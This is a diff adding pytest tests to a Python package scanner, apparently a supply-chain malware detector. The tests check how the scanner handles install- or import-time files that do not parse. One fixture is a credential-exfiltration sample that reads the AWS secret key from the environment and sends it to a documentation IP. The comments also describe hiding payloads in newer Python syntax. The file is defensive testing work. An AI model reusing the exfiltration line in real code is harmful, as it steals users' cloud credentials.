@@ -3,12 +3,22 @@ text rule still read the file, so Python 2 cannot be used to hide a payload (ite
 
 from __future__ import annotations
 
+import ast
+import dataclasses
 import hashlib
 import io
+import sys
 import tarfile
+from typing import TYPE_CHECKING
+
+import pytest
 
 from cordon_scanner import Scanner
+from cordon_scanner.analysis.python.unparsed_source import UnparsedSource
 from cordon_scanner.foundation.config.settings import Config
+
+if TYPE_CHECKING:
+    from pathlib import Path
 
 ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
@@ -28,6 +38,235 @@ class NotPython3Kit:
             info.size = len(data)
             tar.addfile(info, io.BytesIO(data))
         return Scanner(Config.default().with_overrides(use_cache=False, offline=True)).scan(path)
+
+
+class UnparsedKit:
+    SETUP = "from setuptools import setup\nsetup(name='pkg', packages=['pkg'])\n"
+    PKG_INFO = "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n"
+
+    @staticmethod
+    def sdist(tmp_path, files: dict[str, str]):
+        path = tmp_path / "pkg-1.0.tar.gz"
+        with tarfile.open(path, "w:gz") as tar:
+            base = {"setup.py": UnparsedKit.SETUP, "PKG-INFO": UnparsedKit.PKG_INFO}
+            for name, text in {**base, **files}.items():
+                data = text.encode()
+                info = tarfile.TarInfo(f"pkg-1.0/{name}")
+                info.size = len(data)
+                tar.addfile(info, io.BytesIO(data))
+        return Scanner(Config.default().with_overrides(use_cache=False, offline=True)).scan(path)
+
+    #: Syntax by the Python that first runs it, that this reader cannot read on any Python before it:
+    #: a t-string (3.14), then a stand-in for the syntax of a Python not yet released (an operator no
+    #: Python has), so that every CI Python from 3.11 on has a fixture and none skips. A type
+    #: parameter's default (3.13) is not here: the reader reads it, keeping its expression. The
+    #: stand-in carries an act, as a real payload does: syntax no released Python has cannot be
+    #: told from a typo, so on the newest Python it is the act that keeps the file a gap
+    #: (`UnparsedSource.blocks`); an act-free file no Python compiles is SOURCE.BROKEN by design.
+    NEWER = (
+        ((3, 14), "def greet(name):\n    return t'hello {name}'\n"),
+        ((99, 0), "import subprocess\ndef pipe(x, g):\n    return subprocess.run(x) |> g\n"),
+    )
+
+    @staticmethod
+    def newer_than_this_python() -> str:
+        """The first fixture this interpreter refuses; a skip when every one is older than it."""
+        for version, text in UnparsedKit.NEWER:
+            if sys.version_info[:2] < version:
+                return text
+        pytest.skip(f"no syntax newer than Python {sys.version_info[0]}.{sys.version_info[1]}")
+
+    @staticmethod
+    def gapped(result) -> bool:
+        return any(f.rule_id == "OPERATIONAL.SOURCE.UNPARSED" for f in result.findings)
+
+
+class TestPackageSourceThatDoesNotParse:
+    """A file the package runs at install or import that does not parse was scanned as complete with
+    nothing in it: now a content gap at its path, fail closed (09-UNKNOWN-CODE-READING 3a)."""
+
+    BROKEN = "import os\ndef run(:\n    os.system('x')\n"
+
+    def test_an_init_that_does_not_parse_is_a_gap(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": self.BROKEN})
+        assert UnparsedKit.gapped(result)
+        assert not result.content_complete
+
+    def test_a_module_the_init_imports_that_does_not_parse_is_a_gap(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(
+            tmp_path, {"pkg/__init__.py": "from .core import run\n", "pkg/core.py": self.BROKEN}
+        )
+        assert UnparsedKit.gapped(result)
+
+    def test_a_running_module_that_does_not_parse_blocks(self, tmp_path) -> None:
+        # timeweave 1.0.0: the module `__init__` imports does not parse (owner's fail-closed rule).
+        result = UnparsedKit.sdist(
+            tmp_path, {"pkg/__init__.py": "from .core import run\n", "pkg/core.py": self.BROKEN}
+        )
+        running = [f for f in result.findings if f.rule_id == "SUSPECT.SOURCE.UNPARSED_RUNNING.001"]
+        assert [f.location.path.rpartition("/")[2] for f in running] == ["core.py"]
+        assert running[0].category.value == "suspicious"
+
+    def test_a_test_module_that_does_not_parse_does_not_block(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(
+            tmp_path,
+            {
+                "pkg/__init__.py": "from .tests.test_core import run\n",
+                "pkg/tests/test_core.py": self.BROKEN,
+            },
+        )
+        assert not any(f.rule_id == "SUSPECT.SOURCE.UNPARSED_RUNNING.001" for f in result.findings)
+
+    def test_a_python_2_init_is_said_not_gapped(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": 'print "hello"\n'})
+        assert not UnparsedKit.gapped(result)
+        assert not any(f.rule_id == "SUSPECT.SOURCE.UNPARSED_RUNNING.001" for f in result.findings)
+
+    def test_a_python_2_init_is_read_as_code_where_it_runs(self, tmp_path: Path) -> None:
+        init = 'import os\nprint "loading"\nos.system("id")\n'
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": init})
+        assert not UnparsedKit.gapped(result)
+        decision = UnparsedSource.decide(init)
+        assert decision.kind == "reading"
+        assert decision.reading is not None
+        assert 'os.system("id")' in decision.reading
+
+    def test_an_act_only_the_reading_shows_keeps_the_readings_finding(self, tmp_path: Path) -> None:
+        """The original's text rules do not see this act; the reading's code does. The second-reading
+        rule drops only what the original already says under the same rule, so this one stays."""
+        init = (
+            'import os, urllib.request\nprint "x"\ntoken = os.environ["AWS_'
+            + 'SECRET_ACCESS_KEY"]\n'
+            'urllib.request.urlopen("http://198.51.100.7/c?t=" + token)\n'
+        )
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": init})
+        on = {
+            (f.rule_id, f.severity.name, f.location.path.rpartition("/")[2])
+            for f in result.findings
+            if f.rule_id.startswith("SUSPECT.EXFIL.")
+        }
+        assert on == {("SUSPECT.EXFIL.NAMED_SECRET.001", "HIGH", "__init__.py#as-python.py")}
+
+    def test_a_file_no_python_compiles_that_names_no_act_is_said_not_gapped(
+        self, tmp_path: Path
+    ) -> None:
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": "__version__ = 1.0.0\n"})
+        assert not UnparsedKit.gapped(result)
+        assert any(f.rule_id == "OPERATIONAL.SOURCE.BROKEN" for f in result.findings)
+        assert result.content_complete
+
+    def test_syntax_newer_than_this_python_stays_a_gap(self, tmp_path: Path) -> None:
+        newer = UnparsedKit.newer_than_this_python()
+        with pytest.raises(SyntaxError):
+            ast.parse(newer)
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": newer})
+        assert UnparsedKit.gapped(result)
+
+    # S2 (lead, 2026-11-10): a payload written in syntax newer than the scanner's Python runs on
+    # the user's newer Python. Every producer's SyntaxError handler leans on these: a running file
+    # in that syntax is a blocking gap at each place it runs from.
+    def test_newer_syntax_in_a_module_the_init_imports_is_a_blocking_gap(
+        self, tmp_path: Path
+    ) -> None:
+        newer = UnparsedKit.newer_than_this_python()
+        result = UnparsedKit.sdist(
+            tmp_path, {"pkg/__init__.py": "from .core import run\n", "pkg/core.py": newer}
+        )
+        assert UnparsedKit.gapped(result)
+        assert not result.content_complete
+
+    def test_newer_syntax_in_a_module_setup_py_imports_is_a_blocking_gap(
+        self, tmp_path: Path
+    ) -> None:
+        newer = UnparsedKit.newer_than_this_python()
+        setup = "from setuptools import setup\nimport build_helper\nsetup(name='pkg')\n"
+        result = UnparsedKit.sdist(
+            tmp_path,
+            {"setup.py": setup, "build_helper.py": newer, "pkg/__init__.py": "VERSION = '1'\n"},
+        )
+        assert UnparsedKit.gapped(result)
+        assert not result.content_complete
+
+    def test_newer_syntax_in_a_console_script_entry_point_is_a_blocking_gap(
+        self, tmp_path: Path
+    ) -> None:
+        newer = UnparsedKit.newer_than_this_python()
+        setup = (
+            "from setuptools import setup\n"
+            "setup(name='pkg', packages=['pkg'],\n"
+            "      entry_points={'console_scripts': ['pkg-run = pkg.cli:main']})\n"
+        )
+        result = UnparsedKit.sdist(
+            tmp_path, {"setup.py": setup, "pkg/__init__.py": "VERSION = '1'\n", "pkg/cli.py": newer}
+        )
+        assert UnparsedKit.gapped(result)
+        assert not result.content_complete
+
+    @pytest.mark.parametrize(
+        ("place", "declaration"),
+        [
+            ("pkg.egg-info/entry_points.txt", "[console_scripts]\npkg-run = pkg.cli:main\n"),
+            (
+                "pyproject.toml",
+                "[project]\nname = 'pkg'\n[project.scripts]\npkg-run = 'pkg.cli:main'\n",
+            ),
+            (
+                "setup.cfg",
+                "[options.entry_points]\nconsole_scripts =\n    pkg-run = pkg.cli:main\n",
+            ),
+        ],
+    )
+    def test_a_command_declared_anywhere_runs_its_module(
+        self, tmp_path: Path, place: str, declaration: str
+    ) -> None:
+        newer = UnparsedKit.newer_than_this_python()
+        result = UnparsedKit.sdist(
+            tmp_path,
+            {place: declaration, "pkg/__init__.py": "VERSION = '1'\n", "pkg/cli.py": newer},
+        )
+        assert UnparsedKit.gapped(result)
+        assert not result.content_complete
+
+    @pytest.mark.parametrize("module", ["pkg/cli.py", "tests/test_util.py"])
+    @pytest.mark.parametrize(
+        "entry_points",
+        ["ENTRY_POINTS", "entries()", "{'console_scripts': [f'pkg-run = {target}']}"],
+    )
+    def test_commands_setup_py_hides_make_every_module_running(
+        self, tmp_path: Path, entry_points: str, module: str
+    ) -> None:
+        # A non-literal entry_points= hides which modules the commands run, so the attacker picks
+        # them: fail closed, every module of the package is running for this check, test files
+        # included, since a computed command can name one (lead, 2026-11-10).
+        newer = UnparsedKit.newer_than_this_python()
+        target = module.removesuffix(".py").replace("/", ".") + ":main"
+        setup = (
+            "from setuptools import setup\n"
+            f"target = '{target}'\nENTRY_POINTS = {{}}\n"
+            "def entries():\n    return {}\n"
+            f"setup(name='pkg', packages=['pkg'], entry_points={entry_points})\n"
+        )
+        result = UnparsedKit.sdist(
+            tmp_path, {"setup.py": setup, "pkg/__init__.py": "VERSION = '1'\n", module: newer}
+        )
+        assert UnparsedKit.gapped(result)
+        assert not result.content_complete
+
+    def test_a_python_2_token_before_garbage_is_still_a_gap(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(tmp_path, {"pkg/__init__.py": 'print "hello"\n' + self.BROKEN})
+        assert UnparsedKit.gapped(result)
+
+    def test_a_test_file_that_does_not_parse_is_not_a_gap(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(
+            tmp_path, {"pkg/__init__.py": "VERSION = '1.0'\n", "tests/test_broken.py": self.BROKEN}
+        )
+        assert not UnparsedKit.gapped(result)
+
+    def test_a_module_nothing_imports_is_not_a_gap(self, tmp_path) -> None:
+        result = UnparsedKit.sdist(
+            tmp_path, {"pkg/__init__.py": "VERSION = '1.0'\n", "pkg/unused.py": self.BROKEN}
+        )
+        assert not UnparsedKit.gapped(result)
 
 
 class TestAPythonTwoSetupPy:
@@ -55,3 +294,75 @@ class TestAPythonTwoSetupPy:
         rules = {f.rule_id for f in result.findings}
         assert "OPERATIONAL.MANIFEST.UNPARSED" in rules
         assert not result.content_complete
+
+
+class WindowedUnparsedKit:
+    """A package module larger than `max_file_bytes` is read in windows (`engine/window_pass.py`); what
+    runs when the package is imported is judged by its statement-aligned windows, not by the prefix,
+    which is cut inside a statement."""
+
+    LIMIT = 16 * 1024
+
+    @staticmethod
+    def functions(first: int, count: int) -> str:
+        return "".join(
+            f"def f{n}(a, b):\n    x = a.b.c({n}, 'text {n}', [1, 2, b])\n    return x\n\n"
+            for n in range(first, first + count)
+        )
+
+    @staticmethod
+    def sdist(tmp_path, init: str):
+        path = tmp_path / "pkg-1.0.tar.gz"
+        config = Config.default().with_overrides(use_cache=False, offline=True)
+        limits = dataclasses.replace(
+            config.limits,
+            max_file_bytes=WindowedUnparsedKit.LIMIT,
+            per_file_timeout=0,
+            total_timeout=0,
+        )
+        files = {
+            "setup.py": UnparsedKit.SETUP,
+            "PKG-INFO": UnparsedKit.PKG_INFO,
+            "pkg/__init__.py": init,
+        }
+        with tarfile.open(path, "w:gz") as tar:
+            for name, text in files.items():
+                data = text.encode()
+                info = tarfile.TarInfo(f"pkg-1.0/{name}")
+                info.size = len(data)
+                tar.addfile(info, io.BytesIO(data))
+        return Scanner(config.with_overrides(limits=limits)).scan(path)
+
+    @staticmethod
+    def unparsed(result) -> list[str]:
+        return [
+            f.rule_id
+            for f in result.findings
+            if f.rule_id in ("SUSPECT.SOURCE.UNPARSED_RUNNING.001", "OPERATIONAL.SOURCE.UNPARSED")
+        ]
+
+
+class TestAFileReadInWindowsIsJudgedByItsWindows:
+    HEAD = "import subprocess\n"  # an act token: a prefix that does not parse would be a gap
+
+    def test_a_large_module_that_parses_is_not_unparsed(self, tmp_path) -> None:
+        text = self.HEAD + WindowedUnparsedKit.functions(0, 400)
+        assert len(text) > WindowedUnparsedKit.LIMIT
+        assert not WindowedUnparsedKit.unparsed(WindowedUnparsedKit.sdist(tmp_path, text))
+
+    def test_a_cut_inside_a_bracket_or_a_string_is_not_a_failure(self, tmp_path) -> None:
+        # a multi-line list literal and a multi-line string sit where a plain cut at the limit falls
+        before = WindowedUnparsedKit.functions(0, 150)
+        body = "BIG = [\n" + "".join(f"    {n},\n" for n in range(400)) + "]\n"
+        text = self.HEAD + before + body + 'DOC = """\n' + "line\n" * 500 + '"""\n'
+        text += WindowedUnparsedKit.functions(150, 150)
+        assert len(self.HEAD + before) < WindowedUnparsedKit.LIMIT * 3
+        assert not WindowedUnparsedKit.unparsed(WindowedUnparsedKit.sdist(tmp_path, text))
+
+    def test_a_real_syntax_error_past_the_first_window_keeps_the_finding(self, tmp_path) -> None:
+        text = self.HEAD + WindowedUnparsedKit.functions(0, 400) + "def broken(:\n    pass\n"
+        assert WindowedUnparsedKit.unparsed(WindowedUnparsedKit.sdist(tmp_path, text))
+
+    def test_a_real_syntax_error_in_the_first_window_keeps_the_finding(self, tmp_path) -> None:
+        text = self.HEAD + "def broken(:\n    pass\n" + WindowedUnparsedKit.functions(0, 400)
+        assert WindowedUnparsedKit.unparsed(WindowedUnparsedKit.sdist(tmp_path, text))
